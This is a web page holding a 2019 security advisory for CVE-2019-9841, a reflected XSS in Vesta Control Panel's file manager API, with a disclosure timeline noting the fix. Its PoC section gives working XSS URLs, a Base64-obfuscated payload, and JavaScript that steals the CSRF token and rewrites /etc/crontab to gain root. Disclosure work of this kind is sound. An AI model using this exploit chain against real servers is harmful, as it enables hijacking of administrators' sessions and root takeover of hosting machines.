<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">

        <title>[CVE-2019-9841] Vesta Control Panel 0.9.8-23 — Reflected XSS in file manager API</title>

        
        <meta name="description" content="The insufficient output sanitization and inappropriate content type of the responses of the file manager API allows to run arbitrary JavaScript code in the context of the web application.">
        

        <meta name="twitter:card" content="summary">
        <meta name="twitter:site" content="@cyrus_and">
        <meta property="og:url" content="https://cardaci.xyz/advisories/2019/04/15/vesta-control-panel-0.9.8-23-reflected-xss-in-file-manager-api/">
        <meta property="og:title" content="[CVE-2019-9841] Vesta Control Panel 0.9.8-23 — Reflected XSS in file manager API">
        <meta property="og:image" content="https://cardaci.xyz/assets/img/icon.png">
        
        <meta property="og:description" content="The insufficient output sanitization and inappropriate content type of the responses of the file manager API allows to run arbitrary JavaScript code in the context of the web application.">
        

        <link type="application/atom+xml" rel="alternate" href="https://cardaci.xyz/feed.xml" title="Andrea Cardaci" />

        <link rel="icon" href="/assets/img/icon.png">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
        <meta name="theme-color" content="#000000">

        

        <link rel="stylesheet" href="/assets/css/post.css" type="text/css" media="screen"/>
        <link rel="stylesheet" href="/assets/css/print.css" type="text/css" media="print"/>
    </head>
    <body>
        <div id="header">
    <a href="/">Home</a>
    #
    


<a href="/advisories/2019/04/15/vesta-control-panel-0.9.8-23-reflected-xss-in-file-manager-api/">Permalink</a>
<a title="Share on Twitter" href="https://twitter.com/intent/tweet?text=%5BCVE-2019-9841%5D+Vesta+Control+Panel+0.9.8-23+%E2%80%94+Reflected+XSS+in+file+manager+API%0A%0Ahttps%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F04%2F15%2Fvesta-control-panel-0.9.8-23-reflected-xss-in-file-manager-api%2F">Twitter</a>
<a title="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F04%2F15%2Fvesta-control-panel-0.9.8-23-reflected-xss-in-file-manager-api%2F">Facebook</a>
<a title="Share on LinkedIn" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F04%2F15%2Fvesta-control-panel-0.9.8-23-reflected-xss-in-file-manager-api%2F&title=%5BCVE-2019-9841%5D+Vesta+Control+Panel+0.9.8-23+%E2%80%94+Reflected+XSS+in+file+manager+API">LinkedIn</a>

</div>

<div id="container">
    <h1>[CVE-2019-9841] Vesta Control Panel 0.9.8-23 — Reflected XSS in file manager API</h1>
    <p id="post-info">Andrea Cardaci — 15 April 2019</p>
    
    
    <table id="advisory-header">
  <thead>
    <tr>
      <th style="text-align: right"> </th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: right"><strong>Discovered</strong></td>
      <td>2019-03-13</td>
    </tr>
    <tr>
      <td style="text-align: right"><strong>Author</strong></td>
      <td><a href="mailto:cyrus.and@gmail.com">Andrea Cardaci</a></td>
    </tr>
    <tr>
      <td style="text-align: right"><strong>Product</strong></td>
      <td><a href="https://vestacp.com/">Vesta Control Panel</a></td>
    </tr>
    <tr>
      <td style="text-align: right"><strong>Tested versions</strong></td>
      <td>0.9.8-23</td>
    </tr>
    <tr>
      <td style="text-align: right"><strong>CVE</strong></td>
      <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9841">CVE-2019-9841</a></td>
    </tr>
  </tbody>
</table>

    
    <h2 id="abstract">Abstract</h2>

<p>The insufficient output sanitization and inappropriate content type of the responses of the file manager API allows to run arbitrary JavaScript code in the context of the web application. This allows an attacker to impersonate the users of the control panel by tricking them to follow a specially crafted link while authenticated to the web application.</p>

<p>VestaCP users are actual system users and they have the right to manage several services on the hosting server, for example they can create and manage new databases, edit their own crontab, create and manage new mail accounts, etc. They are created by the administrator to whom VestaCP grants full access. This means that triggering the XSS from an administration session could allow an attacker to obtain root access on the hosting server.</p>

<h2 id="details">Details</h2>

<p>A PHP script located at <code class="language-plaintext highlighter-rouge">/file_manager/fm_api.php</code> supposedly provides the API for the file managers plugins that can be installed in VestaCP. The script performs the requested operation then returns the result as a JSON string using <code class="language-plaintext highlighter-rouge">text/html</code> as the content type, often including an error message that reflects some of the provided arguments. By triggering an error using arguments that include a specially crafted HTTP payload it is possible to run arbitrary JavaScript code. For example:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://target.com:8083/file_manager/fm_api.php?action=check_file_type&amp;dir=&lt;img+src=x+onerror=alert(1)+/&gt;
</code></pre></div></div>

<p>Produces:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"result"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"message"</span><span class="p">:</span><span class="s2">"Error: invalid path </span><span class="se">\/</span><span class="s2">home</span><span class="se">\/</span><span class="s2">admin</span><span class="se">\/</span><span class="s2">&lt;img src=x onerror=alert(1) </span><span class="se">\/</span><span class="s2">&gt;"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Since the output is a JSON string, some characters are <code class="language-plaintext highlighter-rouge">\</code>-escaped. It is possible to overcome this limitation by deploying the payload as a Base64 string, for example the above is equivalent to:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://target.com:8083/file_manager/fm_api.php?action=check_file_type&amp;dir=&lt;img+src=x+onerror=eval(atob('YWxlcnQoMSk='))+/&gt;
</code></pre></div></div>

<p>This works out-of-the-box with Firefox and Edge, while Safari and Chrome block the script execution as they detect a possible XSS attempt. Hopefully some smarter payload will be able to bypass their XSS auditors.</p>

<h2 id="poc-from-xss-to-root-access">PoC: from XSS to root access</h2>

<p>VestaCP acts as a wrapper around several system-level operations, the easiest way for an administrator to run a command as <code class="language-plaintext highlighter-rouge">root</code> is probably to alter the <code class="language-plaintext highlighter-rouge">/etc/crontab</code> file via the <code class="language-plaintext highlighter-rouge">/edit/server/cron/</code> page.</p>

<p>For example this cron job creates a file in the web server root as superuser:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* * * * * root id &gt;/usr/local/vesta/web/proof
</code></pre></div></div>

<p>Most of the pages in the VestaCP web application employ a CSRF token, so in order to submit the POST form, the token must be obtained by parsing the HTML.</p>

<p>The following JavaScript function replaces <code class="language-plaintext highlighter-rouge">/etc/crontab</code> and restarts the cron daemon:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="c1">// fetch the CSRF token</span>
    <span class="kd">const</span> <span class="nx">request</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">credentials</span><span class="p">:</span> <span class="dl">'</span><span class="s1">include</span><span class="dl">'</span><span class="p">});</span>
    <span class="kd">const</span> <span class="nx">text</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">request</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">text</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/token="</span><span class="se">([^</span><span class="sr">"</span><span class="se">]</span><span class="sr">+</span><span class="se">)</span><span class="sr">"/</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>

    <span class="c1">// prepare the payload</span>
    <span class="kd">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">id &gt;/usr/local/vesta/web/proof</span><span class="dl">'</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">config</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="s2">`* * * * * root </span><span class="p">${</span><span class="nx">payload</span><span class="p">}</span><span class="s2">\n`</span><span class="p">);</span>

    <span class="c1">// replace the cron config file</span>
    <span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">/edit/server/cron/</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">credentials</span><span class="p">:</span> <span class="dl">'</span><span class="s1">include</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">'</span><span class="s1">content-type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span>
        <span class="p">},</span>
        <span class="na">body</span><span class="p">:</span> <span class="s2">`token=</span><span class="p">${</span><span class="nx">token</span><span class="p">}</span><span class="s2">&amp;v_config=</span><span class="p">${</span><span class="nx">config</span><span class="p">}</span><span class="s2">&amp;v_restart=on&amp;save=Save`</span>
    <span class="p">});</span>
<span class="p">})();</span>
</code></pre></div></div>

<p>For completeness, this is the URL that the victim administrator needs to follow in order to trigger the PoC:</p>

<!-- C-u M-| terser | base64 -w0 | sed 's/+/%2b/g' -->

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://target.com:8083/file_manager/fm_api.php?action=check_file_type&amp;dir=&lt;img+src=x+onerror=eval(atob('KGFzeW5jKCk9Pntjb25zdCByZXF1ZXN0PWF3YWl0IGZldGNoKCIvIix7Y3JlZGVudGlhbHM6ImluY2x1ZGUifSk7Y29uc3QgdGV4dD1hd2FpdCByZXF1ZXN0LnRleHQoKTtjb25zdCB0b2tlbj10ZXh0Lm1hdGNoKC90b2tlbj0iKFteIl0rKSIvKVsxXTtjb25zdCBwYXlsb2FkPSJpZCA%2bL3Vzci9sb2NhbC92ZXN0YS93ZWIvcHJvb2YiO2NvbnN0IGNvbmZpZz1lbmNvZGVVUklDb21wb25lbnQoYCogKiAqICogKiByb290ICR7cGF5bG9hZH1cbmApO2ZldGNoKCIvZWRpdC9zZXJ2ZXIvY3Jvbi8iLHtjcmVkZW50aWFsczoiaW5jbHVkZSIsbWV0aG9kOiJQT1NUIixoZWFkZXJzOnsiY29udGVudC10eXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIn0sYm9keTpgdG9rZW49JHt0b2tlbn0mdl9jb25maWc9JHtjb25maWd9JnZfcmVzdGFydD1vbiZzYXZlPVNhdmVgfSl9KSgpOwo='))+/&gt;
</code></pre></div></div>

<p>After one minute check that the proof file is created in the web server root:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-k</span> https://target.com:8083/proof
<span class="go">uid=0(root) gid=0(root) groups=0(root)
</span></code></pre></div></div>

<h2 id="timeline">Timeline</h2>

<dl>
  <dt>2019-03-15</dt>
  <dd>Disclosed to the VestaCP team.</dd>
  <dt>2019-03-15</dt>
  <dd>MITRE assigns <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9841">CVE-2019-9841</a> to this vulnerability.</dd>
  <dt>2019-04-12</dt>
  <dd>The VestaCP team <a href="https://github.com/serghey-rodin/vesta/commit/c28c5d29a3c61bc8110c11349e3f2309cd537cfa">fixes</a> the vulnerability.</dd>
  <dt>2019-04-15</dt>
  <dd>The VestaCP team <a href="https://github.com/serghey-rodin/vesta/commit/e674bf14fd401f419223f1dd06a6e381a3c188a2">releases</a> version 0.9.8-24.</dd>
</dl>

</div>

<script>
 // add permalink on headings
 document.querySelectorAll('h2, h3, h4, h5, h5').forEach((heading) => {
     const link = document.createElement('a');
     link.className = 'permalink';
     link.href = `#${heading.id}`;
     heading.appendChild(link);
 });

 // add download links (add the following after the block {: download="filename.ext"})
 document.querySelectorAll('div[download]').forEach((node) => {
     const name = node.getAttribute('download');
     const blob = new Blob([node.innerText]);
     const span = document.createElement('span');
     span.className = 'download-label';
     span.appendChild(document.createTextNode(name));
     node.prepend(span);
     const a = document.createElement('a');
     a.setAttribute('href', URL.createObjectURL(blob));
     a.setAttribute('download', name);
     a.appendChild(document.createTextNode(name));
     node.prepend(a);
 });
</script>

        <div id="footer">
            Andrea Cardaci &copy; 2021. All rights reserved (unless explicitly stated otherwise).

        </div>
    </body>
</html>
